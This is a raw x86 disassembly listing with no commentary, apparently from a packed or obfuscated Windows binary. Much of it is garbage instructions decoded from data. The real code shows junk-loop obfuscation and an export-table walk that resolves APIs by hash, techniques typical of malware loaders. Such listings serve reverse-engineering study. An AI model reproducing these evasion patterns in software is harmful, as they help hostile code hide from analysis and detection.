  41a0c3:	aam    0xf1
  41a0c5:	ja     0x41a12e
  41a0c7:	test   BYTE PTR [ebx],0x5f
  41a0ca:	js     0x41a056
  41a0cc:	add    dl,BYTE PTR ds:0x69860f5
  41a0d2:	pusha  
  41a0d3:	mov    dh,0xa4
  41a0d5:	and    al,0xb6
  41a0d7:	mov    esp,0xb08088eb
  41a0dc:	shl    DWORD PTR [edi],1
  41a0de:	outs   dx,BYTE PTR ds:[esi]
  41a0df:	daa    
  41a0e0:	fs (bad) 
  41a0e2:	fmul   st(3),st
  41a0e4:	stc    
  41a0e5:	xchg   esp,eax
  41a0e6:	inc    edi
  41a0e7:	xor    edx,DWORD PTR [ebx-0x59]
  41a0ea:	cld    
  41a0eb:	sub    BYTE PTR [edx],ah
  41a0ed:	inc    ebx
  41a0ee:	mov    ds:0xed914517,al
  41a0f3:	mov    DWORD PTR [edi],edx
  41a0f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0f6:	or     eax,0xfd2e112e
  41a0fb:	jbe    0x41a0e4
  41a0fd:	mov    ds:0x88732d60,eax
  41a102:	mov    eax,ds:0x684f23ec
  41a107:	(bad)
  41a10b:	lods   al,BYTE PTR ds:[esi]
  41a10c:	fsub   QWORD PTR [ecx+edi*2-0x73df038b]
  41a113:	idiv   DWORD PTR [edi+0x72a33576]
  41a119:	xchg   ebx,eax
  41a11a:	push   0xffffffae
  41a11c:	(bad)  [eax+0x3e]
  41a11f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a120:	gs inc ebx
  41a122:	mov    al,0x96
  41a124:	and    BYTE PTR [eax],0xc6
  41a127:	sub    esi,DWORD PTR [ecx+0x35]
  41a12a:	add    BYTE PTR [eax-0x3e],0x9b
  41a12e:	xor    ebp,DWORD PTR [eax]
  41a130:	mov    bh,0x8a
  41a132:	xchg   ecx,eax
  41a133:	fst    QWORD PTR [edi-0x166bc6bc]
  41a139:	iret   
  41a13a:	les    edi,FWORD PTR [ebx]
  41a13c:	sub    eax,0x801f88f4
  41a141:	cwde   
  41a142:	inc    eax
  41a143:	mov    dl,0xfb
  41a145:	and    al,BYTE PTR [ebx-0x443b512c]
  41a14b:	ss dec edi
  41a14d:	push   eax
  41a14e:	dec    edx
  41a14f:	(bad)  
  41a150:	imul   edx,DWORD PTR [ebp-0x22],0xffffffd8
  41a154:	ret    0x90c9
  41a157:	stos   BYTE PTR es:[edi],al
  41a158:	add    dl,BYTE PTR [ecx+0x60]
  41a15b:	xchg   esp,eax
  41a15c:	enter  0x9c2f,0x9b
  41a160:	(bad)  
  41a161:	mov    al,ds:0x1518642c
  41a166:	fdivr  st(4),st
  41a168:	fdiv   QWORD PTR [esi-0x46376e1d]
  41a16e:	pop    ebp
  41a16f:	loope  0x41a134
  41a171:	inc    edx
  41a172:	test   eax,0xdc6eb097
  41a177:	pop    esp
  41a178:	mul    esp
  41a17a:	xor    eax,0x7f697b11
  41a17f:	push   ds
  41a180:	scas   al,BYTE PTR es:[edi]
  41a181:	xchg   ebx,eax
  41a182:	mov    ecx,0x5e0b5484
  41a187:	pop    ss
  41a188:	aam    0x26
  41a18a:	out    dx,al
  41a18b:	cmp    eax,0x6240aee1
  41a190:	arpl   WORD PTR ds:0xae310e20,dx
  41a196:	sub    al,0xf1
  41a198:	aaa    
  41a199:	ja     0x41a1cb
  41a19b:	pop    ss
  41a19c:	mov    dl,0xf9
  41a19e:	xor    DWORD PTR [edi],0xfffffff5
  41a1a1:	gs enter 0xaf36,0x17
  41a1a6:	inc    ecx
  41a1a7:	adc    al,0x96
  41a1a9:	(bad)  
  41a1aa:	outs   dx,DWORD PTR ds:[esi]
  41a1ab:	pop    eax
  41a1ac:	pop    ebp
  41a1ad:	test   al,0x6e
  41a1af:	popf   
  41a1b0:	cmp    edi,DWORD PTR [ecx+0x4]
  41a1b3:	mov    ds:0x12ef989a,al
  41a1b8:	adc    BYTE PTR [ecx+0x695a3c5],dl
  41a1be:	sub    dh,BYTE PTR [ecx+0x45d2e482]
  41a1c4:	push   edi
  41a1c5:	xchg   edi,eax
  41a1c6:	out    0xd,al
  41a1c8:	call   0x82ce:0x194c226f
  41a1cf:	pop    ecx
  41a1d0:	pop    ds
  41a1d1:	adc    ch,BYTE PTR [edx]
  41a1d3:	inc    esp
  41a1d4:	mov    al,ds:0xd75cdf0e
  41a1d9:	and    eax,0x4204a781
  41a1de:	push   edi
  41a1df:	stos   DWORD PTR es:[edi],eax
  41a1e0:	fs std 
  41a1e2:	cdq    
  41a1e3:	mov    BYTE PTR [ebp-0x72],0x8
  41a1e7:	scas   eax,DWORD PTR es:[edi]
  41a1e8:	mov    ebp,0x2f243796
  41a1ed:	ss std 
  41a1ef:	aam    0x67
  41a1f1:	cmp    eax,DWORD PTR [ecx+0x1]
  41a1f4:	adc    edi,DWORD PTR [edi]
  41a1f6:	push   0xffffffe4
  41a1f8:	or     ebx,DWORD PTR [edx-0x159b019c]
  41a1fe:	pop    ebx
  41a1ff:	jge    0x41a18c
  41a201:	inc    ebp
  41a202:	cld    
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42a7d1,0x1c
  41a210:	cmp    DWORD PTR ds:0x42a7d1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7d1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7d1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7d1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a86d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a78d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a779,0x42a86d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a2e8
  41a293:	dec    esi
  41a294:	enter  0x9828,0xd1
  41a298:	jg     0x41a312
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a259
  41a29f:	adc    ch,BYTE PTR [esi]
  41a2a1:	mov    DWORD PTR [ecx-0x532eb8da],eax
  41a2a7:	bound  ebp,QWORD PTR [edi-0x64]
  41a2aa:	(bad)  
  41a2ab:	iret   
  41a2ac:	dec    esi
  41a2ad:	mov    bh,0xf5
  41a2af:	dec    ebp
  41a2b0:	jno    0x41a27a
  41a2b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2b3:	out    0x94,eax
  41a2b5:	dec    edx
  41a2b6:	jle    0x41a2d7
  41a2b8:	and    bh,BYTE PTR ds:0x26e5d600
  41a2be:	in     eax,0xb4
  41a2c0:	and    dh,BYTE PTR [edi]
  41a2c2:	xor    DWORD PTR [eax+0x17],esi
  41a2c5:	icebp  
  41a2c6:	inc    edi
  41a2c7:	mov    cl,0x7b
  41a2c9:	daa    
  41a2ca:	jmp    0x41a2fd
  41a2cc:	enter  0xd91c,0xd9
  41a2d0:	stc    
  41a2d1:	inc    eax
  41a2d2:	jp     0x41a2eb
  41a2d4:	retf   0x1b43
  41a2d7:	mov    edx,0xa47d7772
  41a2dc:	stc    
  41a2dd:	and    al,0xd3
  41a2df:	repz add ebp,ecx
  41a2e2:	ds inc eax
  41a2e4:	bswap  esi
  41a2e6:	xchg   edx,eax
  41a2e7:	add    eax,0x713d92df
  41a2ec:	sbb    al,0xb2
  41a2ee:	ret    
  41a2ef:	cmp    BYTE PTR [ebx+ebp*2],dh
  41a2f2:	mov    ebp,0xc39d260e
  41a2f7:	je     0x341ce7da
  41a2fd:	js     0x41a295
  41a2ff:	adc    DWORD PTR [ecx+0x7ad8d9ed],edx
  41a305:	dec    edi
  41a306:	sahf   
  41a307:	and    BYTE PTR ds:0xc5147384,cl
  41a30d:	or     dl,BYTE PTR [edi]
  41a30f:	test   eax,0xd321c2f8
  41a314:	add    al,0xf6
  41a316:	in     eax,dx
  41a317:	out    dx,al
  41a318:	repz aam 0x81
  41a31b:	xor    al,0xf0
  41a31d:	mov    ebp,0xca0196cd
  41a322:	dec    ebp
  41a323:	sti    
  41a324:	imul   BYTE PTR [ecx+0xe]
  41a327:	mov    bl,0x79
  41a329:	or     esi,DWORD PTR [eax]
  41a32b:	add    eax,0xa5be5451
  41a330:	in     al,dx
  41a331:	retf   0xbf4
  41a334:	adc    BYTE PTR [ebp+0x3611f1af],ch
  41a33a:	fisub  WORD PTR [eiz*8+0x6c486585]
  41a341:	pop    edx
  41a342:	pop    edi
  41a343:	jbe    0x41a331
  41a345:	or     al,BYTE PTR [eax]
  41a347:	jmp    DWORD PTR [eax+0x2c]
  41a34a:	mov    esi,0xb55bdd89
  41a34f:	ret    0xfd1a
  41a352:	mov    ah,0xc0
  41a354:	stc    
  41a355:	inc    esi
  41a356:	loopne 0x41a3ab
  41a358:	retf   0x5f7a
  41a35b:	out    dx,al
  41a35c:	arpl   WORD PTR [ecx+edx*2+0x16856d7],si
  41a363:	push   ds
  41a364:	jg     0x41a393
  41a366:	sahf   
  41a367:	retf   0x7c26
  41a36a:	mov    esi,0x3f746ba1
  41a36f:	xchg   DWORD PTR [ebx-0xc],esp
  41a372:	jmp    0xc46b545f
  41a377:	cmp    al,dh
  41a379:	jl     0x41a3cb
  41a37b:	pop    eax
  41a37c:	(bad)  
  41a37d:	jmp    0x41a363
  41a37f:	loopne 0x41a358
  41a381:	push   0xffffff9f
  41a383:	cmp    ebp,DWORD PTR [eax+0x183cdacc]
  41a389:	icebp  
  41a38a:	cmp    BYTE PTR [esi-0x15],ah
  41a38d:	bound  ebx,QWORD PTR [edi+ebx*4+0x268fd56e]
  41a394:	scas   eax,DWORD PTR es:[edi]
  41a395:	std    
  41a396:	sbb    esi,edx
  41a398:	scas   eax,DWORD PTR es:[edi]
  41a399:	sahf   
  41a39a:	mov    al,0xb8
  41a39c:	mov    bh,0xf3
  41a39e:	and    ah,dl
  41a3a0:	cmp    al,0xf9
  41a3a2:	push   ds
  41a3a3:	enter  0x177c,0x29
  41a3a7:	inc    ebx
  41a3a8:	loop   0x41a414
  41a3aa:	push   0xffffffea
  41a3ac:	es loope 0x41a361
  41a3af:	xor    eax,0xe95356fd
  41a3b4:	jno    0x41a412
  41a3b6:	or     BYTE PTR [esi-0x28],ah
  41a3b9:	into   
  41a3ba:	sub    cl,dh
  41a3bc:	mov    ch,0x56
  41a3be:	out    0xf1,eax
  41a3c0:	jns    0x41a3db
  41a3c2:	or     al,0x98
  41a3c4:	cmp    al,0xf4
  41a3c6:	or     ebp,DWORD PTR [ebp+0x68c60d9f]
  41a3cc:	imul   esp,DWORD PTR [ecx],0xdae0860f
  41a3d2:	popf   
  41a3d3:	(bad)  
  41a3d4:	push   esi
  41a3d5:	inc    ecx
  41a3d6:	aad    0x7b
  41a3d8:	addr16 div al
  41a3db:	inc    ebp
  41a3dc:	out    0x72,eax
  41a3de:	adc    al,0x25
  41a3e0:	mov    ah,0xf4
  41a3e2:	addr16 jno 0x41a377
  41a3e5:	out    0xd5,al
  41a3e7:	inc    esp
  41a3e8:	inc    ecx
  41a3e9:	lock out dx,eax
  41a3eb:	ds cs jp 0x41a396
  41a3ef:	sar    edi,cl
  41a3f1:	sahf   
  41a3f2:	and    esi,DWORD PTR [esi+eax*2]
  41a3f5:	xor    edi,DWORD PTR [eax-0x29ebe6b7]
  41a3fb:	retf   0x1a45
  41a3fe:	dec    eax
  41a3ff:	stos   BYTE PTR es:[edi],al
  41a400:	rcl    DWORD PTR [esi+eax*2],1
  41a403:	pop    ecx
  41a404:	xchg   edx,eax
  41a405:	or     DWORD PTR [edi+0xf],ebx
  41a408:	(bad)  
  41a409:	mov    gs:0x9e94107e,ax
  41a410:	shr    BYTE PTR [esi+0x2ff931fe],cl
  41a416:	cdq    
  41a417:	out    0x61,al
  41a419:	dec    ecx
  41a41a:	mov    eax,ds:0x1210c234
  41a41f:	inc    edx
  41a420:	push   esp
  41a421:	jge    0x41a3e3
  41a423:	adc    al,0x23
  41a425:	dec    ebx
  41a426:	sbb    al,0xc
  41a428:	sbb    BYTE PTR ss:[eax],dh
  41a42b:	or     al,0x4d
  41a42d:	jne    0x41a3d4
  41a42f:	adc    ebx,ebp
  41a431:	(bad)  
  41a433:	jp     0x41a40b
  41a435:	sbb    ebp,edx
  41a437:	dec    esp
  41a438:	adc    ebp,DWORD PTR [ebp+0x5e25a693]
  41a43e:	fimul  WORD PTR [eax+0x385a3aa1]
  41a444:	mov    al,0x87
  41a446:	ds cli 
  41a448:	addr16 mov ch,0xcc
  41a44b:	mov    DWORD PTR [ecx+0x45],eax
  41a44e:	ror    BYTE PTR [esi-0x48cc55d0],0x67
  41a455:	xchg   ebp,eax
  41a456:	push   eax
  41a457:	add    esi,DWORD PTR [edx-0x4d47874f]
  41a45d:	in     al,dx
  41a45e:	sbb    BYTE PTR [esp+ecx*2],ah
  41a461:	in     eax,0x4b
  41a463:	cs aaa 
  41a465:	in     al,0xcc
  41a467:	(bad)  
  41a468:	mov    ebp,0x764bb864
  41a46d:	fldcw  WORD PTR [edx+esi*8-0x11]
  41a471:	aad    0x5e
  41a473:	push   ebp
  41a474:	push   es
  41a475:	aad    0xd0
  41a477:	and    DWORD PTR [esp+edx*8-0x6583aa74],0xdaa8c669
  41a482:	ds jl  0x41a48e
  41a485:	fcmovu st,st(0)
  41a487:	cld    
  41a488:	repnz mov dl,0x5a
  41a48b:	mov    al,ds:0xd5891ceb
  41a490:	pop    esp
  41a491:	out    dx,eax
  41a492:	jle    0x41a50e
  41a494:	loope  0x41a4f2
  41a496:	imul   eax,esi,0x38
  41a499:	cmp    al,0x6
  41a49b:	rol    DWORD PTR [ebp+0x5b3ee052],1
  41a4a1:	jge    0x41a4db
  41a4a3:	sbb    eax,0x172aa9df
  41a4a8:	sbb    cl,dl
  41a4aa:	int3   
  41a4ab:	inc    ebp
  41a4ac:	cmp    ebp,DWORD PTR [ecx]
  41a4ae:	jl     0x41a496
  41a4b0:	sub    edx,edx
  41a4b2:	dec    edi
  41a4b3:	mov    ds:0x4589d345,al
  41a4b8:	in     al,dx
  41a4b9:	mov    DWORD PTR ds:0x42a77d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a77d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a77d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a77d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a811,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a811
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a811,eax
  41a512:	cmp    DWORD PTR ds:0x42a811,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a811,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a811,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a811
  41a551:	inc    eax
  41a552:	mov    ds:0x42a811,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a79d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a79d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a79d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a79d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a79d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a779,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a779
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a779,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a779,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a779,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a779
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a779,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a779,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	into   
  41a68f:	inc    edx
  41a690:	sub    bl,BYTE PTR [eax-0x50]
  41a693:	xlat   BYTE PTR ds:[ebx]
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a6f0
  41a69b:	scas   eax,DWORD PTR es:[edi]
  41a69c:	sbb    DWORD PTR [ebp-0x51dba2aa],0x8ae7a1c5
  41a6a6:	pop    ebx
  41a6a7:	dec    edx
  41a6a8:	aas    
  41a6a9:	int    0xd5
  41a6ab:	pushf  
  41a6ac:	repz pop esi
  41a6ae:	sbb    DWORD PTR [ebp-0x49],eax
  41a6b1:	clc    
  41a6b2:	test   DWORD PTR [ecx+ebx*4],eax
  41a6b5:	aaa    
  41a6b6:	gs test al,0x9c
  41a6b9:	call   0xe9e4:0x49e0b06f
  41a6c0:	cmp    eax,0x956fb8ad
  41a6c5:	add    DWORD PTR [ebx+0x31cfe7da],edi
  41a6cb:	test   edi,ecx
  41a6cd:	xchg   esi,eax
  41a6ce:	add    DWORD PTR [eax+0x716f9dfa],0xffffffa6
  41a6d5:	inc    edi
  41a6d6:	cli    
  41a6d7:	or     ebx,eax
  41a6d9:	in     eax,0xb
  41a6db:	and    DWORD PTR [ecx],ebx
  41a6dd:	mov    eax,ds:0xb4dd856b
  41a6e2:	xor    al,0x5f
  41a6e4:	jnp    0x41a72f
  41a6e6:	mov    DWORD PTR [eax-0x54cee6b5],esi
  41a6ec:	retf   0x81de
  41a6ef:	test   BYTE PTR [esi+0x483b35a2],0xb6
  41a6f6:	push   0xffffffa3
  41a6f8:	xor    dh,dl
  41a6fa:	jbe    0x41a72a
  41a6fc:	leave  
  41a6fd:	dec    ebp
  41a6fe:	aaa    
  41a6ff:	leave  
  41a700:	(bad)  
  41a701:	cld    
  41a702:	stos   DWORD PTR es:[edi],eax
  41a703:	mov    ecx,0x433db8e6
  41a708:	mov    DWORD PTR [ebx-0x52],edi
  41a70b:	ror    DWORD PTR [edx-0x9],1
  41a70e:	jbe    0x41a756
  41a710:	pop    ecx
  41a711:	add    edx,DWORD PTR [edi+ecx*2-0xf825bb3]
  41a718:	cmp    al,cl
  41a71a:	rcr    ebp,cl
  41a71c:	int    0x79
  41a71e:	in     eax,0x83
  41a720:	fmulp  st(7),st
  41a722:	lahf   
  41a723:	addr16 xor edi,0x2e
  41a727:	cld    
  41a728:	arpl   WORD PTR [ebx+0x2772bfec],sp
  41a72e:	cmp    esp,edx
  41a730:	dec    esp
  41a731:	inc    esi
  41a732:	mov    eax,0xc5e53ab7
  41a737:	mov    ah,BYTE PTR [edx]
  41a739:	mov    al,ds:0xbb56ba85
  41a73e:	mov    dl,0x2a
  41a740:	popf   
  41a741:	out    dx,al
  41a742:	test   DWORD PTR ds:0xb18c2a57,edi
  41a748:	in     al,dx
  41a749:	sbb    BYTE PTR [esi+0x7f],dl
  41a74c:	retf   
  41a74d:	lods   eax,DWORD PTR ds:[esi]
  41a74e:	sub    eax,DWORD PTR [esi+0x5f89843e]
  41a754:	push   0x11
  41a756:	and    ch,BYTE PTR [ebp+0x43b961ac]
  41a75c:	mov    BYTE PTR [edi+0x4ee9e04d],0x5e
  41a763:	xchg   edi,eax
  41a764:	sbb    eax,0x7a466b1b
  41a769:	dec    ecx
  41a76a:	fwait
  41a76b:	mov    BYTE PTR [ebx-0x61e04756],cl
  41a771:	sahf   
  41a772:	push   ebx
  41a773:	fild   WORD PTR [ebx+ebx*1+0x73]
  41a777:	das    
  41a778:	sub    al,0xd3
  41a77a:	pop    esp
  41a77b:	int3   
  41a77c:	test   eax,0x1c6f1382
  41a781:	es retf 
  41a783:	aad    0xb7
  41a785:	in     eax,dx
  41a786:	mov    bh,0x8b
  41a788:	repz pop esp
  41a78a:	push   edi
  41a78b:	out    dx,al
  41a78c:	push   esi
  41a78d:	pusha  
  41a78e:	push   esi
  41a78f:	call   0xc70b:0xe32beec3
  41a796:	pop    ecx
  41a797:	fdiv   QWORD PTR [ecx]
  41a799:	or     eax,0xe3fd6785
  41a79e:	sbb    esp,DWORD PTR [edx+eax*8]
  41a7a1:	mov    al,0xae
  41a7a3:	add    BYTE PTR [edx+0x7720a48f],bl
  41a7a9:	pop    es
  41a7aa:	retf   0x1539
  41a7ad:	ins    DWORD PTR es:[edi],dx
  41a7ae:	out    0x5d,eax
  41a7b0:	xchg   ecx,eax
  41a7b1:	aad    0x1e
  41a7b3:	stc    
  41a7b4:	mov    eax,ds:0x9674616d
  41a7b9:	sub    BYTE PTR [esi],al
  41a7bb:	push   0xfffffff3
  41a7bd:	adc    ecx,0xffffffda
  41a7c0:	bound  esi,QWORD PTR [esi-0x43]
  41a7c3:	xor    BYTE PTR [edx-0x1],dl
  41a7c6:	lods   al,BYTE PTR ds:[esi]
  41a7c7:	ins    BYTE PTR es:[edi],dx
  41a7c8:	sbb    esp,ebp
  41a7ca:	adc    DWORD PTR [ebx+0x2e1545ed],esi
  41a7d0:	push   edx
  41a7d1:	sub    al,0xf3
  41a7d3:	cmp    al,0x28
  41a7d5:	jmp    0x40c1018d
  41a7da:	push   ds
  41a7db:	lea    edi,[ebx*4+0x1838a048]
  41a7e2:	mov    dh,0xc3
  41a7e4:	cmp    DWORD PTR [ebp+0x5539370a],ecx
  41a7ea:	and    bl,0xe4
  41a7ed:	mov    edx,0x624dfd4a
  41a7f2:	adc    DWORD PTR ds:0x34ffbbef,ebp
  41a7f8:	test   eax,0x63ff0ea6
  41a7fd:	(bad)
  41a800:	mov    edi,0x960b731
  41a805:	jecxz  0x41a834
  41a807:	jmp    0x6b55:0x4aac6d39
  41a80e:	lods   eax,DWORD PTR ds:[esi]
  41a80f:	mov    DWORD PTR [eax-0x3f],edi
  41a812:	dec    edx
  41a813:	in     eax,0x5d
  41a815:	aas    
  41a816:	test   eax,0x19344ef9
  41a81b:	push   ss
  41a81c:	loope  0x41a87c
  41a81e:	sbb    ebx,DWORD PTR ds:0x60afa1f9
  41a824:	arpl   WORD PTR [ecx+0x4d562b85],cx
  41a82a:	mov    ch,0x84
  41a82c:	sub    BYTE PTR [ebx-0x49],ch
  41a82f:	fild   DWORD PTR [ebp-0x6cc84020]
  41a835:	loope  0x41a893
  41a837:	stc    
  41a838:	mov    DWORD PTR [ebx+ecx*2+0x43],ecx
  41a83c:	adc    eax,0x2a8e33a6
  41a841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a842:	mov    bl,0x8e
  41a844:	adc    al,0xe9
  41a846:	mov    WORD PTR [esi+0x6b],cs
  41a849:	dec    ebp
  41a84a:	in     al,0xd
  41a84c:	pop    esi
  41a84d:	leave  
  41a84e:	sub    BYTE PTR [esi],cl
  41a850:	(bad)  
  41a851:	jge    0x41a866
  41a853:	pop    edx
  41a854:	cmp    DWORD PTR [eax-0x72],ebx
  41a857:	test   al,0x74
  41a859:	inc    eax
  41a85a:	mov    ecx,0xcab14ff0
  41a85f:	cmp    esi,DWORD PTR [esi+0x75]
  41a862:	or     bh,BYTE PTR [ecx+0x5433be63]
  41a868:	cmp    DWORD PTR [eax+edi*2],0x4a06fb2f
  41a86f:	jl     0x41a7f7
  41a871:	je     0x41a88d
  41a873:	inc    eax
  41a874:	lods   eax,DWORD PTR ds:[esi]
  41a875:	cld    
  41a876:	dec    edi
  41a877:	xchg   ebx,eax
  41a878:	test   BYTE PTR [ecx],al
  41a87a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a87b:	fbld   TBYTE PTR [ebp+0x29ac8ed1]
  41a881:	lahf   
  41a882:	ds push esp
  41a884:	jmp    0x41a829
  41a886:	xchg   ebx,eax
  41a887:	inc    ecx
  41a888:	xchg   BYTE PTR [esi-0xb],ch
  41a88b:	pop    edi
  41a88c:	xchg   ebp,eax
  41a88d:	jae    0x41a873
  41a88f:	pop    es
  41a890:	bound  ebx,QWORD PTR [eax+0x74]
  41a893:	inc    edi
  41a894:	inc    edx
  41a895:	mov    ah,0xb1
  41a897:	sbb    al,0x1c
  41a899:	mov    ah,0xb7
  41a89b:	adc    DWORD PTR [eax],esi
  41a89d:	mov    bh,0x8e
  41a89f:	pop    esi
  41a8a0:	mov    cl,BYTE PTR [eax+0x70]
  41a8a3:	jp     0x41a846
  41a8a5:	inc    ebx
  41a8a6:	inc    edx
  41a8a7:	mov    esi,0x1c1d1253
  41a8ac:	dec    edx
  41a8ad:	jae    0x41a8be
  41a8af:	dec    ebx
  41a8b0:	ds sti 
  41a8b2:	add    eax,ebx
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	sbb    esi,0xffffffdc
  41a917:	inc    ebp
  41a918:	and    DWORD PTR [eax-0x2b],ecx
  41a91b:	jg     0x41a995
